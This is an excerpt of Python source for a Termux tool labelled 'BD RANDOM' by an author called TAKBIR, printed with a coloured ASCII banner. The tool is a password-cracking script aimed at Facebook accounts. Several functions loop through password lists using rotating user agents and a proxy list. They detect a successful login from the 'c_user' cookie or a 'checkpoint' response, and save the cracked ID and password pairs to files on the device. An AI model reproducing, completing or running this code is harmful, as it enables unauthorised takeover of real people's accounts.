...
for xd in range(5000):
	...
	ugen.append(uaku2)
try:
	prox= requests.get('https://github.com/TAKBIR69/.TAKBIR-proxy.txt').text
...
logo=("""
\033[0;92m████████╗\033[0;91m █████╗ \033[0;94m██╗  ██╗\033[1;93m██████╗ \033[0;95m██╗\033[36;1m██████╗ 
\033[0;92m╚══██╔══╝\033[0;91m██╔══██╗\033[0;94m██║ ██╔╝\033[1;93m██╔══██╗\033[0;95m██║\033[36;1m██╔══██╗
\033[0;92m   ██║   \033[0;91m███████║\033[0;94m█████╔╝\033[1;93m ██████╔╝\033[0;95m██║\033[36;1m██████╔╝
\033[0;92m   ██║   \033[0;91m██╔══██║\033[0;94m██╔═██╗ \033[1;93m██╔══██╗\033[0;95m██║\033[36;1m██╔══██╗
\033[0;92m   ██║   \033[0;91m██║  ██║\033[0;94m██║  ██╗\033[1;93m██████╔╝\033[0;95m██║\033[36;1m██║  ██║
...
\033[1;33m╔═══════════════════════════════════════════════╗
║\033[1;32m🌺WELLCOME TO TAKBIR TERMUX COMMAND WORLD 2.0🌺\033[1;33m║
╚═══════════════════════════════════════════════╝                                             
\033[32;1m╔═══════════════════════════════════════════════╗
\033[33;1m║ ╔═══════════════════════════════════════════╗ ║
\033[34;1m║ ║❤︎[❥] T𝐎O𝐋 NAME: \033[31;1m\033[32;1m BD RANDOM                 ║ ║
\033[35;1m║ ║❤︎[❥] A𝐔𝐓𝐇𝐎𝐑   : \033[32;1m\033[33;1m TAKBIR                    ║ ║
\033[36;1m║ ║❤︎[❥] G𝐈𝐓𝐇𝐔𝐁   : \033[33;1m\033[34;1m N1X4T            \033[34;1m         ║ ║
\033[35;1m║ ║❤︎[❥] WP       : \033[32;1m\033[33;1m +8801327084556            ║ ║
\033[37;1m║ ║❤︎[❥] F𝐀𝐂𝐄𝐁𝐎𝐎𝐊 : \033[34;1m TAKBIR ISLAM  \033[35;1m            ║ ║
\033[38;1m║ ║❤︎[❥] STATUS   : \033[33;1m\033[32;1m FREE             \033[34;1m         ║ ║
...
def fia():    
			print(logo)
			print('\x1b[97;1m>>> TAKBIR  VERSION :\x1b[1;92m 1.1 ')
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[TAKBIR] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[TAKBIR-CP] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/TAKBIR-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in TAKBIR:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[TAKBIR-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/TAKBIR-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[TAKBIR] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[TAKBIR-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[TAKBIR-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/TAKBIR-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mTAKBIR\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
	...
	'user-agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile SFB/15.0.0034.21 Safari/537.36'
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[TAKBIR-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[TAKBIR-OK] '+uid+' | '+ps+'\33[0;97m')
